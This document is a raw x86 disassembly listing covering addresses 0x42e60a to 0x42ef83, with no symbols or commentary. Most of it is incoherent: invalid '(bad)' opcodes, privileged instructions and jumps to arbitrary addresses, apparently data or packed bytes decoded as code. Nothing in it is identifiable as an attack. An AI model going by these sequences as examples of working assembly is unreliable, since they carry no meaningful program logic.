  42e60a:	add    BYTE PTR [eax],al
  42e60c:	lods   eax,DWORD PTR ds:[esi]
  42e60d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e60e:	ins    DWORD PTR es:[edi],dx
  42e60f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e610:	(bad)
  42e613:	xor    cl,BYTE PTR [edx]
  42e615:	inc    ebp
  42e616:	adc    eax,0x752f4ed2
  42e61b:	xor    al,0x43
  42e61d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e61e:	fwait
  42e61f:	pop    ecx
  42e620:	jne    0x42e66e
  42e622:	jne    0x42e680
  42e624:	jb     0x42e69f
  42e626:	xor    ebp,DWORD PTR [esi-0xa]
  42e629:	and    eax,0xfa64432
  42e62e:	jne    0x42e5b2
  42e630:	shl    DWORD PTR [ecx+0x3],0xc0
  42e634:	xchg   esp,eax
  42e635:	shr    DWORD PTR [edx+0x50],0xdf
  42e639:	hlt    
  42e63a:	mov    esi,0x62f5ea3e
  42e63f:	dec    ecx
  42e640:	mov    al,ds:0x6701a2f
  42e645:	jmp    0x42e652
  42e647:	adc    al,0x34
  42e649:	cmp    dl,BYTE PTR [ebp-0x4d605a4f]
  42e64f:	or     eax,DWORD PTR [ebx-0x639bb4aa]
  42e655:	jg     0x42e623
  42e657:	mov    eax,ds:0x12f98c1f
  42e65c:	mov    eax,ds:0xd82010f9
  42e661:	rcr    bl,0x92
  42e664:	cmp    esi,DWORD PTR [edi]
  42e666:	sub    eax,0x91a66c1a
  42e66b:	iret   
  42e66c:	sbb    cl,BYTE PTR [ebp-0x71cb0f26]
  42e672:	into   
  42e673:	aad    0x7e
  42e675:	add    ebp,ebx
  42e677:	nop
  42e678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e67a:	jl     0x42e66c
  42e67c:	in     al,0xe0
  42e67e:	hlt    
  42e67f:	sbb    eax,0xd566e7ed
  42e684:	xor    al,0x73
  42e686:	and    al,0xd4
  42e688:	loope  0x42e6a8
  42e68a:	or     al,0xa9
  42e68c:	(bad)  
  42e68d:	repnz loop 0x42e6ef
  42e690:	jnp    0x42e662
  42e692:	adc    edx,esp
  42e694:	aas    
  42e695:	fdiv   st(0),st
  42e697:	jne    0x42e6c9
  42e699:	inc    ecx
  42e69a:	pop    edi
  42e69b:	lds    ebx,FWORD PTR [edx+0x36]
  42e69e:	xor    BYTE PTR [ecx],ch
  42e6a0:	icebp  
  42e6a1:	jae    0x42e707
  42e6a3:	leave  
  42e6a4:	mov    esp,0x8fa3fbcf
  42e6a9:	rol    BYTE PTR [esi],1
  42e6ab:	add    eax,0xa49c8f7d
  42e6b0:	mov    ds:0xd9d2a454,eax
  42e6b5:	loope  0x42e690
  42e6b7:	inc    ebx
  42e6b8:	mov    ecx,0xa149a23d
  42e6bd:	ins    DWORD PTR es:[edi],dx
  42e6be:	add    ah,BYTE PTR [esi+0xc]
  42e6c1:	cwde   
  42e6c2:	push   eax
  42e6c3:	je     0x42e6b4
  42e6c5:	jb     0x42e6a0
  42e6c7:	xchg   esi,eax
  42e6c8:	sbb    BYTE PTR [edi],cl
  42e6ca:	retf   0x932c
  42e6cd:	cdq    
  42e6ce:	pop    ecx
  42e6cf:	rcr    BYTE PTR [esi],cl
  42e6d1:	pop    ebx
  42e6d2:	jb     0x42e6a2
  42e6d4:	out    dx,eax
  42e6d5:	adc    ebp,DWORD PTR [edi-0x66b1b3b]
  42e6db:	lahf   
  42e6dc:	mov    DWORD PTR [eax-0x702e870],edx
  42e6e2:	push   ds
  42e6e3:	out    dx,al
  42e6e4:	push   ebp
  42e6e5:	gs xchg edi,eax
  42e6e7:	add    ecx,DWORD PTR [edx]
  42e6e9:	loopne 0x42e735
  42e6eb:	dec    edx
  42e6ec:	lea    esi,[esi-0x2f]
  42e6ef:	inc    ecx
  42e6f0:	js     0x42e6ea
  42e6f2:	ds and esi,edi
  42e6f5:	mov    edi,0x7304f849
  42e6fa:	adc    al,0x3d
  42e6fc:	cmp    dh,ah
  42e6fe:	pop    edi
  42e6ff:	mov    esp,0x4b1edb19
  42e704:	jo     0x42e747
  42e706:	push   0x10
  42e708:	push   cs
  42e709:	int    0xb9
  42e70b:	stc    
  42e70c:	in     al,0xe8
  42e70e:	adc    DWORD PTR [ebx],0x0
	...
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	fidivr DWORD PTR [edx]
  42e781:	bound  ecx,QWORD PTR [edx-0x44]
  42e784:	dec    eax
  42e785:	icebp  
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    al,0x1
  42e78a:	add    BYTE PTR [eax],al
  42e78c:	add    al,0xd0
  42e78e:	stos   DWORD PTR es:[edi],eax
  42e78f:	xchg   ecx,eax
  42e790:	and    bl,BYTE PTR [ecx-0x2c2b8465]
  42e796:	pop    eax
  42e797:	les    ecx,FWORD PTR [eax-0x17dcf72e]
  42e79d:	mov    ah,0xd8
  42e79f:	pop    es
  42e7a0:	adc    edi,DWORD PTR [esi+0x5395d2ff]
  42e7a6:	cli    
  42e7a7:	push   eax
  42e7a8:	xchg   ebp,eax
  42e7a9:	dec    ebp
  42e7aa:	mov    eax,ds:0x504388ac
  42e7af:	pop    ds
  42e7b0:	sbb    ebx,0xffffffe1
  42e7b3:	sub    DWORD PTR [ecx+0x6ca84e00],eax
  42e7b9:	fbld   TBYTE PTR [edi+edx*2-0x59a71a3b]
  42e7c0:	pop    ecx
  42e7c1:	adc    eax,0x3e2b77a
  42e7c6:	and    BYTE PTR [esi-0x23814456],0xe8
  42e7cd:	add    BYTE PTR [esi],0xa0
  42e7d0:	daa    
  42e7d1:	and    eax,0x3f542a69
  42e7d6:	mov    al,BYTE PTR [ecx]
  42e7d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e7d9:	dec    ecx
  42e7da:	sub    ah,0x90
  42e7dd:	dec    edx
  42e7de:	pop    esp
  42e7df:	mov    ah,0xa4
  42e7e1:	mov    edx,0xdfd082d6
  42e7e6:	sbb    DWORD PTR [edx],esi
  42e7e8:	imul   esp,DWORD PTR [edi+0x12f0ad4e],0xb0d449e0
  42e7f2:	xchg   edi,eax
  42e7f3:	dec    esi
  42e7f4:	lock nop
  42e7f6:	sub    al,0x83
  42e7f8:	and    cl,ah
  42e7fa:	popa   
  42e7fb:	mov    bl,ah
  42e7fd:	pop    esp
  42e7fe:	(bad)  
  42e7ff:	imul   eax,DWORD PTR [edi+ebp*2],0xffffff96
  42e803:	dec    ebx
  42e804:	or     BYTE PTR [ecx-0x7701d9bd],al
  42e80a:	ficomp DWORD PTR ds:0x30ccc0e7
  42e810:	or     bh,BYTE PTR [ebx]
  42e812:	cmovo  edi,DWORD PTR [ebx]
  42e815:	xor    al,cl
  42e817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e818:	lock push esi
  42e81a:	adc    al,0x19
  42e81c:	std    
  42e81d:	test   BYTE PTR [ebp+esi*2+0x1d625f4e],al
  42e824:	popa   
  42e825:	xchg   ecx,eax
  42e826:	shl    DWORD PTR [eax],0xce
  42e829:	xchg   edx,eax
  42e82a:	xor    ecx,DWORD PTR [ebp-0x29]
  42e82d:	out    dx,al
  42e82e:	dec    DWORD PTR [ecx]
  42e830:	inc    edi
  42e831:	push   ebx
  42e832:	test   BYTE PTR [ecx-0xec40edf],bh
  42e838:	sbb    al,0x17
  42e83a:	fstp   QWORD PTR [ecx+0x5a]
  42e83d:	mov    DWORD PTR [edi+0x6a],esi
  42e840:	inc    edx
  42e841:	sub    al,0x15
  42e843:	out    0x73,al
  42e845:	fidivr DWORD PTR [esi-0x28]
  42e848:	addr16 push ds
  42e84a:	mov    al,ds:0xaa692f01
  42e84f:	shl    BYTE PTR [edi-0x76],1
  42e852:	js     0x42e8d0
  42e854:	aad    0x86
  42e856:	js     0x42e8d7
  42e858:	hlt    
  42e859:	add    eax,0xd0ccafb8
  42e85e:	sbb    BYTE PTR [edx-0x7d],ah
  42e861:	xchg   ecx,eax
  42e862:	sbb    al,0x29
  42e864:	push   esp
  42e865:	jb     0x42e865
  42e867:	push   eax
  42e868:	les    ecx,FWORD PTR [ebp-0x1f]
  42e86b:	mov    ecx,0xb557d688
  42e870:	std    
  42e871:	imul   esp,DWORD PTR [ebx],0xddaf7fa4
  42e877:	es pop ss
  42e879:	push   0x8
  42e87b:	jecxz  0x42e8ee
  42e87d:	aam    0xaf
  42e87f:	pop    ebp
  42e880:	sub    BYTE PTR [ecx],cl
  42e882:	xchg   BYTE PTR [edx],ah
  42e884:	aad    0x2c
  42e886:	js     0x42e86c
  42e888:	es cld 
  42e88a:	ins    DWORD PTR es:[edi],dx
  42e88b:	pop    es
  42e88c:	cld    
  42e88d:	mov    al,ds:0x62b7
	...
  42e8f2:	add    BYTE PTR [eax],al
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx+0x2a23f82b]
  42e901:	mov    ecx,cs
  42e903:	and    ecx,DWORD PTR [edx+esi*8+0x1]
  42e907:	add    BYTE PTR [ecx+eax*1],al
  42e90a:	add    BYTE PTR [eax],al
  42e90c:	mov    cl,0x2d
  42e90e:	cmp    al,0xd7
  42e910:	xor    DWORD PTR [edi-0x3eb341c8],ebx
  42e916:	stos   BYTE PTR es:[edi],al
  42e917:	clc    
  42e918:	ret    0x87bf
  42e91b:	arpl   sp,sp
  42e91d:	xor    al,BYTE PTR [eax-0x1b]
  42e920:	scas   al,BYTE PTR es:[edi]
  42e921:	repnz int 0x54
  42e924:	cmc    
  42e925:	xchg   ecx,eax
  42e926:	ins    DWORD PTR es:[edi],dx
  42e927:	jecxz  0x42e943
  42e929:	mov    dl,0xc
  42e92b:	inc    edx
  42e92c:	stos   BYTE PTR es:[edi],al
  42e92d:	addr16 or ebx,ecx
  42e930:	retf   0x87f9
  42e933:	js     0x42e945
  42e935:	(bad)  
  42e936:	nop
  42e937:	fst    QWORD PTR [esi]
  42e939:	push   ecx
  42e93a:	add    BYTE PTR [ecx+0x1221da35],0xa
  42e941:	loopne 0x42e996
  42e943:	xor    BYTE PTR ds:0x4b3ca410,ch
  42e949:	std    
  42e94a:	mov    ds:0x467d11ec,eax
  42e94f:	mov    es,WORD PTR [edx+0x64640a2c]
  42e955:	xchg   edi,eax
  42e956:	xchg   edx,eax
  42e957:	ds pop ebx
  42e959:	pop    ecx
  42e95a:	(bad)  
  42e95c:	ds stos DWORD PTR es:[edi],eax
  42e95e:	pop    eax
  42e95f:	cwde   
  42e960:	jmp    0x4f371773
  42e965:	dec    eax
  42e966:	addr16 popa 
  42e968:	mov    ch,0x24
  42e96a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e96b:	mov    dl,0x5f
  42e96d:	push   esi
  42e96e:	sub    eax,0x4cb63c7e
  42e973:	add    BYTE PTR [edi+ebx*2+0x7ad513b6],0x47
  42e97b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e97c:	outs   dx,DWORD PTR ds:[esi]
  42e97d:	cdq    
  42e97e:	or     al,0xb8
  42e980:	and    DWORD PTR [eax+edi*1],ebp
  42e983:	mov    cl,0x11
  42e985:	cdq    
  42e986:	and    al,BYTE PTR [ebp-0x6e6c3701]
  42e98c:	xchg   esi,eax
  42e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e98e:	adc    DWORD PTR [ebx],0xc66db5b6
  42e994:	(bad)  
  42e995:	stos   BYTE PTR es:[edi],al
  42e996:	enter  0x55e3,0x45
  42e99a:	mov    es,WORD PTR [esi+eax*4]
  42e99d:	clc    
  42e99e:	pop    es
  42e99f:	ror    BYTE PTR [edx+0x1da891dd],0x65
  42e9a6:	mov    edx,0x976dea3b
  42e9ab:	in     al,0x60
  42e9ad:	xchg   ecx,eax
  42e9ae:	mov    dh,0x1f
  42e9b0:	xchg   ecx,eax
  42e9b1:	or     eax,DWORD PTR [esi-0x38]
  42e9b4:	rol    BYTE PTR [ebx],0xee
  42e9b7:	das    
  42e9b8:	xchg   edi,eax
  42e9b9:	mov    bh,BYTE PTR [esi]
  42e9bb:	pop    edi
  42e9bc:	mov    edi,0xb60af9f
  42e9c1:	sub    ebx,DWORD PTR [edx]
  42e9c3:	je     0x42ea35
  42e9c5:	mov    esi,0x725dd601
  42e9ca:	js     0x42e9bf
  42e9cc:	call   0x2058f643
  42e9d1:	pusha  
  42e9d2:	aaa    
  42e9d3:	ins    BYTE PTR es:[edi],dx
  42e9d4:	mov    bl,0x7a
  42e9d6:	aaa    
  42e9d7:	rcl    DWORD PTR [esi+0x191bfdc],0x3
  42e9de:	int3   
  42e9df:	nop
  42e9e0:	jno    0x42ea27
  42e9e2:	xchg   esp,eax
  42e9e3:	arpl   WORD PTR [esi+0x5626bc0e],cx
  42e9e9:	or     esp,DWORD PTR [edx-0x1faa5c86]
  42e9ef:	jno    0x42e9d0
  42e9f1:	inc    edi
  42e9f2:	mov    BYTE PTR [ecx],0x64
  42e9f5:	push   ss
  42e9f6:	mov    ah,0x97
  42e9f8:	ss sub bh,ch
  42e9fb:	dec    esp
  42e9fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e9fd:	jmp    DWORD PTR [edx-0x3e72cf89]
  42ea03:	test   BYTE PTR [ecx-0x4d632c6b],bl
  42ea09:	cs mov bl,0x1
  42ea0c:	repz das 
  42ea0e:	inc    esp
  42ea0f:	mov    eax,0x0
	...
  42ea74:	in     eax,0xba
  42ea76:	xchg   edx,eax
  42ea77:	jecxz  0x42ea58
  42ea79:	jmp    0x42ea70
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	repz retf 
  42ea82:	add    eax,0x1f35027
  42ea87:	add    BYTE PTR [ecx+eax*1],al
  42ea8a:	add    BYTE PTR [eax],al
  42ea8c:	js     0x42ea21
  42ea8e:	inc    esi
  42ea8f:	jmp    0x21d98bf2
  42ea94:	add    BYTE PTR [bp+di+0x33],ch
  42ea98:	pop    es
  42ea99:	cmp    BYTE PTR [ebx+0x1312818d],ah
  42ea9f:	(bad)  
  42eaa0:	adc    BYTE PTR [ebx-0x5204f919],cl
  42eaa6:	push   edi
  42eaa7:	mov    ebx,0x87b3da82
  42eaac:	outs   dx,BYTE PTR ds:[esi]
  42eaad:	xor    dl,BYTE PTR [esi]
  42eaaf:	sbb    eax,0x84425b58
  42eab4:	mov    bl,0xa5
  42eab6:	shl    DWORD PTR gs:[edx],1
  42eab9:	unpcklps xmm2,XMMWORD PTR [esi+ebp*8]
  42eabd:	retf   
  42eabe:	or     ecx,DWORD PTR [eax-0x5a01c5b9]
  42eac4:	ins    DWORD PTR es:[edi],dx
  42eac5:	bound  ebp,QWORD PTR [eax]
  42eac7:	out    0xee,ax
  42eaca:	in     eax,dx
  42eacb:	pop    esp
  42eacc:	(bad)
  42ead0:	add    bl,BYTE PTR [eax-0x5f15625b]
  42ead6:	inc    edx
  42ead7:	xchg   edx,eax
  42ead8:	xchg   ecx,eax
  42ead9:	cmp    DWORD PTR [edi],ebp
  42eadb:	or     ebx,ebx
  42eadd:	dec    ebp
  42eade:	sbb    al,0x85
  42eae0:	retf   0xfa7b
  42eae3:	pop    edi
  42eae4:	mov    ebp,0xd59b8db
  42eae9:	mov    ds:0x3cd39296,eax
  42eaee:	(bad)  
  42eaef:	mov    esi,0x9adc414c
  42eaf4:	pop    edx
  42eaf5:	fs inc eax
  42eaf7:	clc    
  42eaf8:	jl     0x42ea86
  42eafa:	inc    eax
  42eafb:	mov    ds:0x50bca0ca,eax
  42eb00:	enter  0x3c0a,0x2f
  42eb04:	sub    al,0xc
  42eb06:	jno    0x42eaff
  42eb08:	call   eax
  42eb0a:	add    BYTE PTR [ebx],dh
  42eb0c:	jo     0x42eb63
  42eb0e:	pop    esp
  42eb0f:	mov    ecx,0x15dcae92
  42eb14:	ins    BYTE PTR es:[edi],dx
  42eb15:	adc    ecx,DWORD PTR [ecx-0x3b]
  42eb18:	pop    ecx
  42eb19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eb1a:	xchg   edx,eax
  42eb1b:	or     al,0xa0
  42eb1d:	out    dx,eax
  42eb1e:	inc    esp
  42eb1f:	jmp    0xd246:0xeacd6f90
  42eb26:	dec    ecx
  42eb27:	cmp    esp,eax
  42eb29:	ins    BYTE PTR es:[edi],dx
  42eb2a:	in     eax,0xa6
  42eb2c:	sub    esp,0x12
  42eb2f:	push   0x38f746c9
  42eb34:	ss ja  0x42eb64
  42eb37:	in     al,0x13
  42eb39:	mov    bl,0x12
  42eb3b:	cmp    DWORD PTR [ecx+0x260534e2],ecx
  42eb41:	int3   
  42eb42:	out    dx,al
  42eb43:	test   eax,0x245320b0
  42eb48:	jl     0x42eb95
  42eb4a:	es neg edx
  42eb4d:	sub    DWORD PTR [esi],eax
  42eb4f:	arpl   WORD PTR [ecx],cx
  42eb51:	jge    0x42eb0a
  42eb53:	sub    bl,BYTE PTR [ebp+0x2d]
  42eb56:	(bad)  
  42eb57:	lea    ebp,[ebx+0x6a]
  42eb5a:	sbb    al,0x54
  42eb5c:	(bad)  
  42eb5d:	icebp  
  42eb5e:	shl    DWORD PTR [ebp+0xe323638],cl
  42eb64:	mov    ds:0xefb9bbc2,al
  42eb69:	pop    edi
  42eb6a:	(bad)  
  42eb6b:	jmp    0x42eb4b
  42eb6d:	lahf   
  42eb6e:	push   0x6a
  42eb70:	fist   WORD PTR [ecx-0x18]
  42eb73:	test   eax,0x71e2fed3
  42eb78:	pop    edi
  42eb79:	das    
  42eb7a:	push   edx
  42eb7b:	in     eax,0x2d
  42eb7d:	jb     0x42eb93
  42eb7f:	jae    0x42ebea
  42eb81:	loop   0x42eb8c
  42eb83:	jmp    0x2ce92dae
  42eb88:	in     al,dx
  42eb89:	lds    ebp,FWORD PTR [esp+ebp*8+0x76]
  42eb8d:	fwait
  42eb8e:	outs   dx,BYTE PTR ds:[esi]
  42eb8f:	dec    ebx
	...
  42ebf4:	jle    0x42ec37
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	sbb    DWORD PTR [ebx],0x54df3c48
  42ec05:	hlt    
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    al,0x1
  42ec0a:	add    BYTE PTR [eax],al
  42ec0c:	stc    
  42ec0d:	mov    bh,0xd3
  42ec0f:	cwde   
  42ec10:	jmp    0x42ec10
  42ec12:	(bad)  
  42ec13:	mov    cr5,ebp
  42ec16:	push   ds
  42ec17:	cmc    
  42ec18:	retf   
  42ec19:	mov    BYTE PTR [ebx],ch
  42ec1b:	fcmovnbe st,st(0)
  42ec1d:	mov    ah,0xba
  42ec1f:	cmp    ch,BYTE PTR [edx+esi*2-0x33dbb665]
  42ec26:	jecxz  0x42ec79
  42ec28:	out    0x1,eax
  42ec2a:	out    dx,eax
  42ec2b:	fnstenv [ebp+0x46]
  42ec2e:	sbb    BYTE PTR [ebx-0x422605d2],dh
  42ec34:	or     ecx,edx
  42ec36:	cmc    
  42ec37:	cli    
  42ec38:	sahf   
  42ec39:	test   eax,0x4b8074e2
  42ec3e:	inc    eax
  42ec3f:	cmp    eax,0x320d3e
  42ec44:	xor    al,0xeb
  42ec46:	push   edi
  42ec47:	mov    ah,0xd6
  42ec49:	xor    ah,BYTE PTR [edx+ecx*1-0x13]
  42ec4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec4e:	leave  
  42ec4f:	fst    QWORD PTR [eax]
  42ec51:	xchg   ebp,eax
  42ec52:	stos   DWORD PTR es:[edi],eax
  42ec53:	mov    BYTE PTR [esi],dh
  42ec55:	addr16 mov ecx,0xade7dee9
  42ec5b:	in     al,dx
  42ec5c:	mov    ecx,0x3429e0cb
  42ec61:	cmp    BYTE PTR [ecx+eax*4-0x42b115f6],cl
  42ec68:	ds inc esi
  42ec6a:	clc    
  42ec6b:	xchg   ecx,eax
  42ec6c:	pop    ds
  42ec6d:	pop    esi
  42ec6e:	or     cl,BYTE PTR [eax-0x4fdccf11]
  42ec74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ec75:	or     ebx,DWORD PTR ds:0x8bf859d
  42ec7b:	sub    ebp,DWORD PTR ds:0xde30464e
  42ec81:	jecxz  0x42ecbe
  42ec83:	das    
  42ec84:	or     ecx,DWORD PTR [ebp-0x36bb9428]
  42ec8a:	xor    BYTE PTR [esi-0x4c],ah
  42ec8d:	gs inc esp
  42ec8f:	jo     0x42ecad
  42ec91:	xor    edi,DWORD PTR [edi+0x2522049f]
  42ec97:	jmp    0x89a0:0xa6fbe40e
  42ec9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ec9f:	repnz inc edx
  42eca1:	popf   
  42eca2:	or     eax,0x4942aa9a
  42eca7:	test   BYTE PTR [edi],dl
  42eca9:	jno    0x42ecee
  42ecab:	aaa    
  42ecac:	lods   al,BYTE PTR ds:[esi]
  42ecad:	mov    ds:0xc94932,al
  42ecb2:	push   es
  42ecb3:	inc    ebp
  42ecb4:	dec    eax
  42ecb5:	jecxz  0x42eca5
  42ecb7:	sar    ah,1
  42ecb9:	test   eax,0x5cdc5ad0
  42ecbe:	mov    BYTE PTR [eax-0x3532765],dl
  42ecc4:	out    dx,eax
  42ecc5:	repnz mov ds:0xaee61837,al
  42eccb:	test   DWORD PTR [eax-0x1],edi
  42ecce:	push   eax
  42eccf:	(bad)  
  42ecd0:	and    al,0xd2
  42ecd2:	mov    eax,0xdced93ac
  42ecd7:	(bad)  
  42ecd8:	in     eax,dx
  42ecd9:	inc    esp
  42ecda:	or     DWORD PTR [edx+0x57],ebx
  42ecdd:	xchg   bh,al
  42ecdf:	xor    DWORD PTR [ebx+0x17],eax
  42ece2:	dec    ebx
  42ece3:	ja     0x42ecf5
  42ece5:	call   0xad9a:0xdfebe9bc
  42ecec:	pop    esp
  42eced:	cmp    esi,DWORD PTR [ebx]
  42ecef:	call   0x9d84736f
  42ecf4:	jecxz  0x42ecf6
  42ecf6:	jns    0x42ecfb
  42ecf8:	add    al,0xea
  42ecfa:	adc    al,0xb1
  42ecfc:	(bad)  
  42ecfd:	mov    ebp,0x25a39a70
  42ed02:	sbb    BYTE PTR [ebp+0x495bdcf9],0xd9
  42ed09:	or     al,0xe3
  42ed0b:	inc    edi
  42ed0c:	test   ah,0x26
  42ed0f:	rol    DWORD PTR [eax],0x0
	...
  42ed72:	add    BYTE PTR [eax],al
  42ed74:	sub    dh,dh
  42ed76:	scas   eax,DWORD PTR es:[edi]
  42ed77:	fdivr  st,st(7)
  42ed79:	fnstcw WORD PTR [edi-0xa]
  42ed7c:	jecxz  0x42edb0
  42ed7e:	test   DWORD PTR [edx+0xa9055b8],esp
  42ed84:	pop    eax
  42ed85:	cmc    
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    al,0x1
  42ed8a:	add    BYTE PTR [eax],al
  42ed8c:	pop    ebx
  42ed8d:	jmp    0x42edfe
  42ed8f:	(bad)  
  42ed90:	rol    esi,0x93
  42ed93:	inc    ebp
  42ed94:	test   al,0xbd
  42ed96:	xor    eax,0x275fe7db
  42ed9b:	loopne 0x42edaa
  42ed9d:	push   eax
  42ed9e:	push   0x726a2f97
  42eda3:	dec    ecx
  42eda4:	out    0x8f,al
  42eda6:	xor    ah,BYTE PTR [edx-0x72e3677c]
  42edac:	int    0x5c
  42edae:	retf   
  42edaf:	push   ss
  42edb0:	xor    edx,eax
  42edb2:	sti    
  42edb3:	stos   BYTE PTR es:[edi],al
  42edb4:	dec    esp
  42edb5:	mov    dl,0x86
  42edb7:	dec    edi
  42edb8:	push   edx
  42edb9:	push   cs
  42edba:	mov    eax,ds:0x7f35a32a
  42edbf:	jae    0x42ed77
  42edc1:	sub    dl,bh
  42edc3:	(bad)  
  42edc4:	mov    cl,0xd5
  42edc6:	mov    esp,0x545dc9a6
  42edcb:	or     DWORD PTR [ecx+0x3a],edx
  42edce:	or     eax,0x2b8008e2
  42edd3:	xchg   BYTE PTR [eax+0x3d],bl
  42edd6:	retf   
  42edd7:	jns    0x42ed6a
  42edd9:	push   ds
  42edda:	pushf  
  42eddb:	imul   ebp,DWORD PTR [edi],0xffffff9b
  42edde:	in     eax,dx
  42eddf:	push   ss
  42ede0:	dec    eax
  42ede1:	add    ebx,DWORD PTR [eax+ecx*8+0x65]
  42ede5:	(bad)  
  42ede6:	xor    eax,0xad0f2f2a
  42edeb:	or     edx,DWORD PTR [ecx+0x4e3b3be7]
  42edf1:	and    al,0x56
  42edf3:	jmp    0xda32bd2c
  42edf8:	je     0x42ee51
  42edfa:	and    ebx,DWORD PTR [ebx-0xe451502]
  42ee00:	mov    WORD PTR [ebx],cs
  42ee02:	mov    ds:0xafc7eeee,eax
  42ee07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee08:	pushf  
  42ee09:	cwde   
  42ee0a:	shr    BYTE PTR [eax+0x6c],cl
  42ee0d:	dec    edx
  42ee0e:	lea    edi,[ecx]
  42ee10:	out    0x4a,eax
  42ee12:	and    BYTE PTR [eax+0x7b971c54],0x52
  42ee19:	jae    0x42ee85
  42ee1b:	inc    ebx
  42ee1c:	int3   
  42ee1d:	push   eax
  42ee1e:	mov    bh,0xbb
  42ee20:	data16 test al,0x51
  42ee23:	add    eax,0xe0062536
  42ee28:	clc    
  42ee29:	jmp    0x63d57bb7
  42ee2e:	cwde   
  42ee2f:	pop    esi
  42ee30:	rol    cl,1
  42ee32:	inc    edi
  42ee33:	fistp  QWORD PTR [ebx]
  42ee35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee36:	test   al,dl
  42ee38:	adc    al,bh
  42ee3a:	sbb    al,0xda
  42ee3c:	inc    edi
  42ee3d:	bound  edx,QWORD PTR [edx-0x200f7c14]
  42ee43:	mov    BYTE PTR [edx-0x2c1078db],bl
  42ee49:	mov    ch,0xec
  42ee4b:	imul   esi,eax,0x57
  42ee4e:	cld    
  42ee4f:	sub    DWORD PTR [eax+0xe2bca36],ebp
  42ee55:	xor    al,0x10
  42ee57:	cli    
  42ee58:	test   eax,0xd4f0d775
  42ee5d:	add    DWORD PTR [edi],esi
  42ee5f:	cmp    ebp,ebp
  42ee61:	inc    ecx
  42ee62:	mov    cl,0x6f
  42ee64:	sbb    al,0x71
  42ee66:	aas    
  42ee67:	int3   
  42ee68:	fwait
  42ee69:	jno    0x42ee41
  42ee6b:	mov    ebx,0xd12b27f6
  42ee70:	(bad)  
  42ee71:	gs pop edx
  42ee73:	mov    bh,0x8d
  42ee75:	pop    ecx
  42ee76:	jmp    0x42ee87
  42ee78:	or     al,0x8e
  42ee7a:	addps  xmm2,xmm3
  42ee7d:	je     0x42eed4
  42ee7f:	inc    eax
  42ee80:	out    0x70,al
  42ee82:	or     al,0xd4
  42ee84:	out    dx,eax
  42ee85:	xchg   edx,eax
  42ee86:	(bad)  
  42ee88:	add    BYTE PTR [ecx-0x51019191],0xe7
  42ee8f:	mov    eax,DWORD PTR [eax]
	...
  42eef1:	add    BYTE PTR [eax],al
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	sub    eax,0x5c951744
  42ef05:	test   BYTE PTR [ecx],0x0
  42ef08:	add    al,0x1
  42ef0a:	add    BYTE PTR [eax],al
  42ef0c:	call   0xfe6938b7
  42ef11:	fs jne 0x42eea4
  42ef14:	inc    edx
  42ef15:	ins    BYTE PTR es:[edi],dx
  42ef16:	rcr    dl,cl
  42ef18:	pusha  
  42ef19:	stos   DWORD PTR es:[edi],eax
  42ef1a:	hlt    
  42ef1b:	dec    edx
  42ef1c:	push   eax
  42ef1d:	ss mov cl,0x9
  42ef20:	xchg   esp,eax
  42ef21:	xchg   esp,eax
  42ef22:	shl    DWORD PTR [ecx-0x33],1
  42ef25:	mov    esi,0x428bbe19
  42ef2a:	jge    0x42ef0d
  42ef2c:	enter  0x56fa,0x76
  42ef30:	div    DWORD PTR ds:0x8e2f674e
  42ef36:	jnp    0x42ef61
  42ef38:	aaa    
  42ef39:	pusha  
  42ef3a:	jnp    0x42ef33
  42ef3c:	stos   BYTE PTR es:[edi],al
  42ef3d:	cmp    ch,BYTE PTR [edx]
  42ef3f:	mov    eax,0x973ebb25
  42ef44:	and    al,cl
  42ef46:	mov    eax,ds:0xd84095f6
  42ef4b:	dec    esp
  42ef4c:	mov    esp,0x77a14a07
  42ef51:	pop    esp
  42ef52:	lock fwait
  42ef54:	call   0xfda2:0x99399a58
  42ef5b:	(bad)  
  42ef5c:	call   0xc03b6a26
  42ef61:	xchg   esi,eax
  42ef62:	scas   eax,DWORD PTR es:[edi]
  42ef63:	and    DWORD PTR [eax],edi
  42ef65:	xchg   ecx,eax
  42ef66:	xor    dh,bl
  42ef68:	sub    bh,dl
  42ef6a:	or     DWORD PTR [ebx+0x10c9f08b],edx
  42ef70:	mov    esp,0x6a6b4c5
  42ef75:	scas   al,BYTE PTR es:[edi]
  42ef76:	dec    ecx
  42ef77:	jns    0x42efa3
  42ef79:	leave  
  42ef7a:	pop    eax
  42ef7b:	sbb    al,BYTE PTR [ebx]
  42ef7d:	mov    WORD PTR [edi],gs
  42ef7f:	push   ds
  42ef80:	lea    ebp,[ebx+0xe]
  42ef83:	pop    esp
